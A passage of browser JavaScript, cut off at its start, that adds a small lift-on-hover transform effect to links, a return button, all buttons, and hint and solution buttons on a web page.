        this.style.transform = 'translateY(-2px)';
    });
    
    link.addEventListener('mouseleave', function() {
        this.style.transform = 'translateY(0)';
    });
});

// Add hover effects to return button
const returnBtn = document.querySelector('.return-btn');
if (returnBtn) {
    returnBtn.addEventListener('mouseenter', function() {
        this.style.transform = 'translateY(-2px)';
    });
    
    returnBtn.addEventListener('mouseleave', function() {
        this.style.transform = 'translateY(0)';
    });
}

// Add hover effects to any buttons in the content
const buttons = document.querySelectorAll('button');
buttons.forEach(button => {
    button.addEventListener('mouseenter', function() {
        this.style.transform = 'translateY(-2px)';
    });
    
    button.addEventListener('mouseleave', function() {
        this.style.transform = 'translateY(0)';
    });
});

// Add hover effects to hint and solution buttons
const hintButtons = document.querySelectorAll('.hint-btn, .solution-btn');
hintButtons.forEach(button => {
    button.addEventListener('mouseenter', function() {
        this.style.transform = 'translateY(-2px)';
    });
    
    button.addEventListener('mouseleave', function() {
        this.style.transform = 'translateY(0)';
    });
}); 